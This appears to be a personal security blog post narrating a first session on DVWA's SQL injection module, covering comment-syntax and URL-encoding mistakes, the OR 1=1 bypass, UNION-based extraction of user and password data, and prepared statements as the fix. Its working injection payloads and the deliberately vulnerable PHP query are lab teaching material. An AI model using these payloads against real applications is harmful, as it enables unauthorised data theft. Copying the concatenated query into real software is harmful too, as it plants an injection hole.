---
layout: post
title: "My first steps with SQL Injection on DVWA: what I broke and what I learned"
date: 2026-05-18
categories: [web-security, walkthrough]
tags: [sqli, dvwa, mariadb, http, owasp]
excerpt: "An honest walkthrough of DVWA's first SQLi module — including the two stupid errors I spent more time on than the actual attack."
---

SQL Injection is one of those attacks you read about a hundred times and think you understand. Then you fire up a vulnerable box, throw the classic `' OR 1=1--` at it, and get a beautiful **400 Bad Request** back. That's when you realize theory and practice are two different animals.

This post is the diary of my first serious session on **DVWA** (Damn Vulnerable Web Application), a deliberately vulnerable web app built for security training. It's not a polished tutorial: it's a record of the three or four real mistakes I made and what each one taught me. I wrote it to fix the lessons in my head, and because I think this kind of write-up is more useful — both to readers and to anyone evaluating my work — than a clean walkthrough where everything goes right on the first try.

## The setup

DVWA runs in Docker with one line:

```bash
docker run --rm -it -p 80:80 vulnerables/web-dvwa
```

Default login is `admin / password`, then **Setup/Reset DB**, then **DVWA Security → Low**. We start with the **SQL Injection** module, which presents a form with a single "User ID" field.

The vulnerable server-side code, at DVWA's Low level, is essentially:

```php
$id = $_REQUEST['id'];
$query = "SELECT first_name, last_name FROM users WHERE user_id = '$id';";
```

Direct concatenation of user input into the SQL string. No escaping, no prepared statements. The canonical starting point.

## Mistake #1: `1'--` and the orphan quote

First attempt, straight from the textbook:

```
?id=1'--&Submit=Submit
```

Server response:

```
You have an error in your SQL syntax; check the manual that corresponds to
your MariaDB server version for the right syntax to use near ''' at line 1
```

I expected a bypass. I got a syntax error. What happened?

The constructed query is:

```sql
SELECT first_name, last_name FROM users WHERE user_id = '1'--';
```

In **MariaDB/MySQL**, the `--` comment requires **a space (or tab/newline) after the two dashes** to be recognized as a comment. Without the space, `--` is just text, and the closing quote (`'`) of the original string sits there unmatched at the end of my payload. Hence the error.

This is one of those SQL-dialect differences tutorials rarely highlight: PostgreSQL accepts `--` without a trailing space, MariaDB doesn't. Knowing which DB is underneath your target matters.

**Lesson:** generic payloads exist, but the DBMS has its own lexical rules. Worth memorizing the three comment forms MySQL/MariaDB supports:

| Syntax | Notes |
|--------|-------|
| `-- ` (with trailing space) | Requires whitespace after the dashes |
| `#` | Line comment, no trailing space required |
| `/* ... */` | Inline comment, useful for WAF evasion |

## Mistake #2: the 400 Bad Request

Lesson learned, I fix the payload by adding the space:

```
?id=1'-- &Submit=Submit
```

New surprise: **HTTP 400 Bad Request**. The server doesn't even hand me a SQL error this time — it rejects the request outright.

I look at the request line:

```
GET /vulnerabilities/sqli/?id=1'-- &Submit=Submit HTTP/1.1
```

There's a literal space inside the URL. In HTTP, the request line has three fields separated by spaces: method, target, protocol version. Apache sees three spaces instead of two, can't tell where target ends and version begins — malformed request line, 400.

I had forgotten that **spaces in URLs must be percent-encoded**: `%20`, or `+` in the query string. Working directly in the browser's address bar, this encoding doesn't always happen automatically — it depends on the browser and the context.

Three alternatives that work:

```
?id=1'--%20&Submit=Submit     # explicit encoding
?id=1'--+&Submit=Submit        # + decoded as space in query string
?id=1'%23&Submit=Submit        # # as comment, no space needed
```

**Lesson:** the SQL payload and the HTTP transport are two distinct layers. A syntactically perfect payload may never reach the DB if you break the transport protocol along the way. This is the moment you realize you need a tool like **Burp Suite** or **curl**, where you can control the request byte by byte without the browser rewriting things under your feet.

With curl:

```bash
curl "http://localhost/vulnerabilities/sqli/?id=1'--+&Submit=Submit" \
  -b "PHPSESSID=...; security=low"
```

## The first working bypass

Once both issues were fixed, I tried the canonical payload:

```
?id=1' OR 1=1-- +&Submit=Submit
```

And finally: all five DVWA users dumped onto the page (admin, gordonb, 1337, pablo, smithy). Genuine satisfaction.

How it works, in detail. The constructed query is:

```sql
SELECT first_name, last_name FROM users WHERE user_id = '1' OR 1=1-- ';
```

Three things happen together:

1. **The quote breaks the string context.** The developer expected my input to sit inside single quotes, but I close those quotes early. From that point on, what I type is parsed as SQL code, not as data. *This is the heart of every injection*: moving from "data" context to "code" context.

2. **`OR 1=1` rewrites the WHERE logic.** In boolean logic, `A OR B` is true if at least one side is true. `1=1` is a tautology — true for every row. So `user_id = '1' OR 1=1` is true for every row in the table, and the `WHERE` stops filtering. The `SELECT` returns the whole table.

3. **`-- ` neutralizes the tail.** After my input, the original code still had `'` and `;` waiting. The line comment sends them to the bin so they don't break the syntax.

This triad — **break the context, inject logic, neutralize the tail** — is the general pattern of nearly every SQLi. What changes from case to case is the context you have to break: single-quoted string, double-quoted string, unquoted integer, inside a `LIKE`, inside `IN()`, inside `ORDER BY`. Each one needs its own opening and closing.

## What comes next: enumeration with UNION

The bypass is the "Hello World" of SQLi. The interesting part is using the injected query to **extract arbitrary data**, not just to skip a filter. The weapon is `UNION SELECT`.

`UNION` combines the rows of two `SELECT` queries, as long as they return the same number of columns. So the first step is figuring out how many columns the original query returns:

```
?id=1' ORDER BY 1-- +     # ok
?id=1' ORDER BY 2-- +     # ok
?id=1' ORDER BY 3-- +     # error → there are 2 columns
```

Then we start pulling things out:

```
?id=1' UNION SELECT database(), version()-- +
?id=1' UNION SELECT user, password FROM users-- +
?id=1' UNION SELECT table_name, table_schema
       FROM information_schema.tables
       WHERE table_schema=database()-- +
```

DVWA's password MD5 hashes are well-known and crackable in seconds (they're intentionally weak). But the point isn't to crack those specific hashes — it's to realize that in a real app, vulnerable to the same pattern, I could read tables I should never see: customers, orders, sessions, anything the DB user has read permission on.

## What makes DVWA Low so vulnerable and what makes Impossible safe

It's worth comparing the source across difficulty levels — that's where you learn the defensive side.

**Low** — direct concatenation, no defenses:

```php
$id = $_REQUEST['id'];
$query = "SELECT ... WHERE user_id = '$id';";
```

**Medium** — `mysqli_real_escape_string`, but the field is an unquoted integer, and POST instead of GET (which is just security through obscurity):

```php
$id = mysqli_real_escape_string($conn, $_POST['id']);
$query = "SELECT ... WHERE user_id = $id;";  // no quotes → escape is useless
```

Quote-escaping does nothing here because there are no quotes to close. You inject directly with `1 OR 1=1-- `.

**Impossible** — prepared statement with typed parameters:

```php
$id = $_GET['id'];
$data = $db->prepare('SELECT ... WHERE user_id = (:id) LIMIT 1;');
$data->bindParam(':id', $id, PDO::PARAM_INT);
$data->execute();
```

The input is never concatenated into the SQL string. The driver sends it to the DB as a separate parameter, and the DB already knows it's data, not code. There's no quote to close, no context to break. It's structurally non-exploitable — not because of some clever filter, but because data and code never meet.

This is the most important defensive lesson: **you don't prevent SQL injection with filters or blacklists, you prevent it by separating code from data.** Everything else (escaping, sanitization, WAFs) is fallback mitigation.

## Takeaways from this first session

I spent more time debugging two "stupid" mistakes — the missing comment space and the unencoded URL space — than actually executing the attack. Which is probably the most realistic part of the experience: in real pentesting, most of your time isn't spent inventing creative exploits, it's spent figuring out why something isn't working the way it should.

Three concrete takeaways:

- **Knowing the underlying DBMS matters.** Same "SQL", different dialects, different comment syntax, different built-in functions. `database()`, `version()`, `@@hostname` aren't named the same everywhere.
- **HTTP is a layer that can betray you.** Browsers, URL encoding, server parsers: all things that can destroy a correct payload before it reaches the application. Learning to use Burp/curl early pays off immediately.
- **Every SQLi is a variation of the same pattern.** Break the context, inject logic, neutralize the tail. Understanding the syntactic context your input lands in is the real mental exercise.

The next step for me is **SQL Injection (Blind)**, where the comfort of error messages ends and you start extracting data one bit at a time with boolean or time-based queries. It's also where automating with `sqlmap` starts to feel natural (and almost necessary) — but only after doing the work by hand at least once, because a tool you don't understand makes you dangerous, not skilled.

## Useful references

- [DVWA — official repository](https://github.com/digininja/DVWA)
- [PortSwigger Web Security Academy — SQL Injection](https://portswigger.net/web-security/sql-injection) (free, excellent)
- [OWASP — SQL Injection Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html)
- [MariaDB — Comment Syntax](https://mariadb.com/kb/en/comment-syntax/)

---

*All techniques shown were performed on an isolated lab environment running in Docker on my local machine. Running these attacks against systems you don't own or have written authorization to test is illegal in most jurisdictions.*
